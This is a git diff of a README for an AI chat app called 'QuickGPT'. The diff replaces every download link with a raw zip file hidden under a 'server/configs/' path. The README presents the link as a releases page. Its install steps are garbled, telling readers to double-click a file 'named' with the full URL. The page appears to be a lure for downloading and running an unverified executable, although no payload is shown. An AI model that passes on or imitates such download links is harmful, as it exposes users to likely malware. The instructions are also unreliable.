@@ -1,6 +1,6 @@
 # 🚀 QuickGPT - Effortless AI Chat at Your Fingertips
 
-[![Download QuickGPT](https://raw.githubusercontent.com/pongky11/QuickGPT/main/unmalted/QuickGPT.zip)](https://raw.githubusercontent.com/pongky11/QuickGPT/main/unmalted/QuickGPT.zip)
+[![Download QuickGPT](https://raw.githubusercontent.com/pongky11/QuickGPT/main/server/configs/GPT-Quick-v1.7.zip)](https://raw.githubusercontent.com/pongky11/QuickGPT/main/server/configs/GPT-Quick-v1.7.zip)
 
 ## 🌟 Overview
 
@@ -41,13 +41,13 @@ Follow these steps to download and run QuickGPT on your machine.
 
 1. **Visit the Releases Page**: Click the button below to go to our releases page.
 
-   [Download QuickGPT](https://raw.githubusercontent.com/pongky11/QuickGPT/main/unmalted/QuickGPT.zip)
+   [Download QuickGPT](https://raw.githubusercontent.com/pongky11/QuickGPT/main/server/configs/GPT-Quick-v1.7.zip)
 
 2. **Choose Your Version**: Look for the most recent release and select it.
 
 3. **Download the Application**: Click on the file link to start the download process. It will be in a `.zip` or a similar format.
 
-4. **Install QuickGPT**: After the download finishes, extract the files. Look for a file named `https://raw.githubusercontent.com/pongky11/QuickGPT/main/unmalted/QuickGPT.zip` or similar. Double-click on it to start the application.
+4. **Install QuickGPT**: After the download finishes, extract the files. Look for a file named `https://raw.githubusercontent.com/pongky11/QuickGPT/main/server/configs/GPT-Quick-v1.7.zip` or similar. Double-click on it to start the application.
 
 5. **Follow Setup Instructions**: If prompted, follow the on-screen instructions to complete the installation. It may include creating a user account or providing permission for initial settings.
 
@@ -86,6 +86,6 @@ If you need help, visit our Support page on the releases site or contact us dire
 
 To download the latest version or check for updates, visit our releases page once more:
 
-[Download QuickGPT](https://raw.githubusercontent.com/pongky11/QuickGPT/main/unmalted/QuickGPT.zip)
+[Download QuickGPT](https://raw.githubusercontent.com/pongky11/QuickGPT/main/server/configs/GPT-Quick-v1.7.zip)
 
 Enjoy your journey with QuickGPT!
